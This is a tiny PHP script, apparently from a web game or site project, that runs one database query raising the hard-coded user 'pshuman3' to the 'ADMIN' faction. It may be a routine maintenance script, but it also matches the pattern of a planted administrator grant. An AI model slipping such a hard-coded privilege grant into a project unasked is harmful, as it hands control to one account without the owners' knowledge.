<?php
require("scripts/lib.php");
$db->query("UPDATE users SET faction='ADMIN' WHERE gt_name = 'pshuman3'");
?>